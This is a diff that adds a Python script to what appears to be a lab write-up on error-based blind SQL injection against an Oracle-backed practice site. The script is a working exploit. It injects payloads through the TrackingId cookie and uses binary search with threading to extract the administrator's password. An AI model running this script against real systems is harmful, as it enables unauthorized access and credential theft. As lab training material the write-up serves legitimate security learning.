@@ -91,7 +91,105 @@ Instead of testing exact character matches, the payload converts the target char
 `...CASE WHEN ASCII(SUBSTR(password,1,1)) > 100 THEN TO_CHAR(1/0) ELSE '' END...`
 
 By repeatedly halving the possibility space, a Binary Search guarantees finding the exact character in approximately 6-7 requests, regardless of whether the character is 'a' or 'z'.
+```python
+import requests
+import sys
+import concurrent.futures
 
+URL = "https://0a9d000c04d641c28039087e003d00c4.web-security-academy.net/filter?category=Pets"
+BASE_TRACKING_ID = "xyz"                       # replace with your real TrackingId cookie value
+SESSION_ID = "FZNVQJcHYXuUyiq958V2R14vFFJ3jEL9" # replace with your current session cookie
+
+session = requests.Session()
+TIMEOUT = 10
+
+
+def oracle(condition: str) -> bool:
+    """True  -> the injected condition evaluated TRUE (server threw 500)
+       False -> condition evaluated FALSE (normal response)"""
+    payload = f"{condition}--"
+    cookies = {'TrackingId': BASE_TRACKING_ID + payload, 'session': SESSION_ID}
+    try:
+        r = session.get(URL, cookies=cookies, timeout=TIMEOUT)
+    except requests.RequestException as e:
+        print(f"\n[!] Request failed: {e}", file=sys.stderr)
+        raise
+    return r.status_code >= 500
+
+
+def sanity_check():
+    """
+    Confirms the oracle actually works before burning hundreds of requests
+    on a broken session/cookie. Tests a condition known to be TRUE and one
+    known to be FALSE.
+    """
+    true_cond = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+    false_cond = "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+
+    is_true = oracle(true_cond)
+    is_false = oracle(false_cond)
+
+    if is_true and not is_false:
+        print("[+] Sanity check passed — oracle is working correctly.")
+        return
+    print("[-] Sanity check FAILED:")
+    print(f"    1=1 condition returned: {is_true} (expected True)")
+    print(f"    1=2 condition returned: {is_false} (expected False)")
+    print("    Check that BASE_TRACKING_ID/SESSION_ID are current, and that")
+    print("    you're still logged into the lab session in your browser.")
+    sys.exit(1)
+
+
+def get_length(max_len=100) -> int:
+    lo, hi = 1, max_len
+    while lo < hi:
+        mid = (lo + hi) // 2
+        cond = (f"'||(SELECT CASE WHEN LENGTH(password)<={mid} THEN TO_CHAR(1/0) "
+                f"ELSE '' END FROM users WHERE username='administrator')||'")
+        if oracle(cond):
+            hi = mid
+        else:
+            lo = mid + 1
+    print(f"[+] Password length: {lo}")
+    return lo
+
+
+def get_char_at(pos: int, lo: int = 32, hi: int = 126) -> str:
+    while lo < hi:
+        mid = (lo + hi) // 2
+        cond = (f"'||(SELECT CASE WHEN ASCII(SUBSTR(password,{pos},1))<={mid} "
+                f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
+        if oracle(cond):
+            hi = mid
+        else:
+            lo = mid + 1
+    return chr(lo)
+
+
+def get_data(length: int) -> str:
+    chars = [None] * length
+    # keep worker count modest -- Oracle labs occasionally choke under heavy
+    # concurrency and start returning inconsistent results
+    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
+        futures = {ex.submit(get_char_at, i + 1): i for i in range(length)}
+        for fut in concurrent.futures.as_completed(futures):
+            idx = futures[fut]
+            try:
+                chars[idx] = fut.result()
+            except requests.RequestException:
+                chars[idx] = "?"
+            sys.stdout.write(f"\r[+] {''.join(c or '_' for c in chars)}")
+            sys.stdout.flush()
+    print()
+    return "".join(chars)
+
+
+if __name__ == "__main__":
+    sanity_check()
+    pwd_length = get_length()
+    password = get_data(pwd_length)
+    print(f"[+] Administrator password: {password}")
+```
 ---
 
 ## 5. Defense & Prevention
